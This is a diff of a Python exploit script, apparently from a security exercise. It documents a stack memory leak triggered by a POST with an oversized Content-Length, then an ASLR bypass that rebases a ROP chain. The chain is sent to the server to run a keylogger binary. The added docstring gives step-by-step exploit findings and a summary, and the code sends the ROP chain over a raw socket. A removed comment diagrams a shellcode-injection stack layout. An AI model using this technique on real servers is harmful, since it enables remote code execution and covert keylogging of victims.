@@ -1,21 +1,37 @@
 '''
 [FINDINGS]
-Exploit in POST, writes the given data but also everything higher then then adresses on the stack
-Example stack:
-              handle_client_frame
-                |
+Exploit in POST, writes the given data to the appointer file, data.txt in this case
+The handle and next handle_client functions are called after the POST request is sent
+The handle_client function makes a buffer and later puts the POST-PAYLOAD in that buffer
+Later the handle_client function calls the parse_request function which reads the buffer and writes it to the data.txt file 
+Because we only wrote a small amount of data to the buffer, the rest of the buffer is filled null bytes and doesn't get overwritten,
+but we also passed in the POST request a very large Content-Length, which causes the parse_request function to read the buffer fully and more.
+Thus causing it to write the buffer but also all the data on the stack above the buffer to the data.txt file
+This data contains the stack of the handle_client function and handle and all the data that was pushed on the stack
+Now we can find the RET address back to the handle function, but in this case we used RAX since that points to the first instruction of handle.
+Like in this stack:
+             handle | handle_client
+                    |
                 <===========================================> 
-                <return><======================0x530========>
+                <pushes><======================0x530========>
                     |                    <===POST-PAYLOAD===>
                     |
                     |
-                    └> <...rbp,rbx,RAX,RET,rbp,r15,r14,r12,rbx> ---> zie demo.txt
+                    └> <...rbp,rbx,RAX,RET,rbp,r15,r14,r12,rbx> ---> view demo.txt
          
-    
-Looking at handle_client, the 6th address which we push on the stack is the rbp of handle_client
-Find address using that data
-Use that address to calculate the offset to the adres space of scenario_2
-Use that offset to calculate the offset of the ropchain
+Like in scenario 2, we can use the same technique and execute a ROP chain to run the keylog binary
+The problem due to ASLR is that all the addresses in this chain arn't static.
+But since we now the address of the handle function of the current run, 
+we can calculate the offset to the original handle function which the ROP chain is based on.
+We can then use that to calculate the offset to the ROP chain addresses.
+Now our ROP chain is adjusted to the servers base address offset of ASLR and we can execute it to run the keylog binary.
+
+[EXPLOIT SUMMARY]
+POST request with a large Content-Length and small payload to write the stack to the data.txt file
+Download the data.txt file and find the RET address back to the handle function
+Calculate the offset to the original handle function and adjust the ROP chain to the servers base address offset
+Adjust the ROP chain to the servers base address offset
+Send the ROP chain to the server to execute the keylog binary
 '''
 
 from keystone import *
@@ -133,30 +149,4 @@ rop_exploit = create_ropchain_attack(handle_address)
 input("Upload the keylogger. Press any key to continue...")
 
 remote(host, port).send(rop_exploit)
-
-
-
-
-# details for 'payload_rsp_offset':
-#
-# stack representation after return to the injected shell code:
-#
-#                            current_rsp <┐            ┌> original_rbp           ┌> start of vulnerable buffer
-#                                         |            |                         |
-#                                         ||<---0x10-->|<---------0x450--------->|
-# stack: <high addresses> =|======<1>======|retaddr|<2>|===========<3>===========| <low addresses>  (stack grow direction -->)
-#                          |               |           |<5>|=========<4>=========|
-#                          └> current_rbp  |               |==<6>==|==<7>=|==<8>=|
-#                                          |                       |<-24->|<-49->|
-#                                          |<--payload_rsp_offset->|
-#                                                                  └> start of injected payload
-# Legend:
-#   <1>: caller stack frame
-#   <2>: spilled rbp of the caller
-#   <3>: log_message stack frame
-#   <4>: vulnerable buffer
-#   <5>: other local variables   -> 5 VARS so 0x20 big
-#   <6>: injected payload
-#   <7>: "GET /data.txt HTTP/1.1\r\n"
-#   <8>: "== Request from..."
 
